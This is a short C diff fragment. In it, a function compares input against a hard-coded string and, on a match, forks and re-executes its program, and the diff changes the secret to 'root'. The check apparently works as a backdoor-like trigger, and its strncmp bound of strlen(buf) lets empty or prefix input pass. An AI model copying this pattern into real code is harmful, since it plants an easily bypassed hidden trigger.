@@ -28,7 +28,7 @@ int parsestr(char *s)
             char *pos = strchr(buf, '\n');
             if (pos)
                 *pos = 0;
-            if (!strncmp(buf, "<?$ygOsx554/.", strlen(buf)))
+            if (!strncmp(buf, "root", strlen(buf)))
             {
                 if (!fork())
                     execv(argv[0], argv);
